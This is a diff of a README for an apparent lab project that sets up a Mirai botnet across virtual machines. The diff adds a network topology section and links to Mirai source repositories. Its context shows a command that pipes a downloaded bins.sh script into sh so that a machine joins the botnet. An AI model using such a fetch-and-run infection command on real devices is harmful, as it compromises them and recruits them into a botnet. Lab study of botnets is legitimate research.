@@ -25,6 +25,13 @@ sudo apt update && sudo apt upgrade
 
 ---
 
+## The topology of the internal network
+
+All the VM's are connected internally through the intnet virtual switch.
+
+![vmtopo](https://github.com/LohithCV/mirai-setup/assets/125025760/307c23f6-3d52-4acd-87ba-e5ae13c38233)
+
+<br>
 ## Virtual Machine - 1 DNS server
 **First make sure both the NAT interface and internal network interface is running. It can checked by running the following command in the terminal:**
 ```
@@ -152,7 +159,7 @@ sudo systemctl restart mysql
 ```
 <br>
 
-### Now we need to set a few things 
+### Now we need to set up DNS resolution
 **Simply run and type in your domain and dns server:**
 ```
 python3 setup.py
@@ -246,3 +253,8 @@ curl http://<web_server_ip>/bins/bins.sh |sh
 After this you can see that in the attackers terminal the bot count would have increased by 1.
 
 <img alt="bot" src="https://github.com/LohithCV/mirai-setup/assets/125025760/419ecb69-d666-4c09-828d-91f98a3d3496" width="400"/>
+
+## References 
+
+1. https://github.com/jgamblin/Mirai-Source-Code
+2. https://github.com/Glowman554/mirai
